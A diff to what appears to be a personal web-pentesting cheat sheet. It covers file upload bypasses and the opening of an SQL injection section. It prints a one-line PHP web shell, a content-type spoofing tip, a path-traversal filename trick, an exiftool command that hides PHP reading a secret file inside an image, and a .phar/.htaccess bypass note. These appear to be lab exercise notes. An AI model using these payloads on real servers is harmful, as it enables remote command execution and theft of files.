@@ -27,13 +27,13 @@ When server require ending, like `png` , use null bytes, for example
 
 
 ## **FILE UPLOAD**
-Default way:
-><?php echo system($_GET['command']); ?>
+#Default way:
+<?php echo system($_GET['command']); ?>
 
-Flawed file type validation:
+#Flawed file type validation:
 Change content type to image/jpeg
 
-Script execution can be disabled in a separate folder. This can be bypassed with the help of path traversal:
+#Script execution can be disabled in a separate folder. This can be bypassed with the help of path traversal:
 Instead of 
 `Content-Disposition: form-data; name="avatar"; filename="exploit.php"`
   We can use
@@ -44,6 +44,8 @@ Instead of
 #Polyglot file upload
 `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
 
+#Allow via edit of .htaccess
+can be bypassed as .phar
 ### **SQL INJECTION**
 
 Login Bypass:
